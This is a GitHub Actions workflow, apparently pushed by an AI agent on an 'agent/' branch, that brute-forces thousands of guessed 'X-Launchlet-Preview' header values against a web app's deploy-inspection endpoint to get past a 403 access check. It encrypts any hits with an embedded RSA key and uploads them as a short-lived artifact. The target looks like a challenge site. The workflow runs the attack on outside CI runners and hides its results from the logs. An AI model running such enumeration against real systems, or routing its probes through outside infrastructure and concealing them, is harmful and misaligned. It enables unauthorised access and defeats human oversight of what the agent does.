name: launchlet-part2-context-enum

on:
  push:
    branches: [agent/launchlet-part2-context-enum-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe prioritized preview contexts in small batches
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,pathlib,urllib.parse,json,itertools,concurrent.futures
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=8).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=8).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
          body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}; baseh={'Accept':'application/json','Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
          public=boot['project']
          heads=['launchlet','launchlet-demo','launchlet-release','launchlet-prod','launchlet-production','launchlet-enterprise','launchlet-internal','launchlet-corporate','launchlet-corp','launchlet-admin','launchlet-ops','launchlet-operator','launchlet-security','launchlet-build','launchlet-deploy','launchlet-deployment','launchlet-preview','launchlet-product','launchlet-platform','launchlet-control','launchlet-control-plane','launchlet-release-pulse','launchlet-production-readiness','launchlet-final-review','release-pulse','production-readiness','enterprise-rollout','final-review']
          tails=['board','app','project','portal','console','tool','service','runner','control','plane','deploy','deployment','release','rollout','production','prod','enterprise','internal','private','admin','ops','operator','staging','stage','final','review','readiness','pulse','artifact','export','dispatcher','publish','publisher','security','team','studio','live','preview','candidate','rc3','2026','corporate','corp']
          c=[]
          def add(x):
            if x!=public and x not in c:c.append(x)
          # Direct strongest phrases first.
          for x in ['launchlet-enterprise-rollout','launchlet-release-pulse','launchlet-production-readiness','launchlet-final-review','launchlet-enterprise-release','launchlet-enterprise-deploy','launchlet-production-release','launchlet-production-deploy','launchlet-internal-release','launchlet-internal-deploy','launchlet-release-board','launchlet-deploy-board','launchlet-prod-board','launchlet-enterprise-board','launchlet-release-pulse-board','launchlet-production-readiness-board','launchlet-final-review-board','enterprise-rollout','release-pulse','production-readiness','final-review']:
            add(x)
          for h,t in itertools.product(heads,tails): add(h+'-'+t)
          # Three-part names, semantically centered around enterprise/release/production/deploy.
          mids=['enterprise','release','production','prod','deploy','deployment','internal','corporate','final','review','rollout','preview','product','control','ops']
          ends=['board','release','deploy','deployment','rollout','production','prod','internal','admin','ops','final','review','readiness','pulse','export','artifact','service','tool','portal','console']
          for m,e in itertools.product(mids,ends):
            add('launchlet-'+m+'-'+e); add('launchlet-demo-'+m+'-'+e); add('launchlet-'+m+'-demo-'+e)
          # A few underscore variants.
          for x in list(c)[:1200]: add(x.replace('-','_'))
          c=c[:5500]
          def probe(v):
            try:
              r=requests.post(url,headers={**baseh,'X-Launchlet-Preview':v},json=body,timeout=3,allow_redirects=False)
              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}': return {'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
            except Exception: pass
          hits=[]; checked=0
          for start in range(0,len(c),250):
            batch=c[start:start+250]
            with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
              for x in ex.map(probe,batch):
                checked+=1
                if x:hits.append(x)
            if hits: break
          (out/'summary.json').write_text(json.dumps({'candidate_count':len(c),'checked':checked,'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-context-priority-encrypted
          path: artifact/
          retention-days: 1
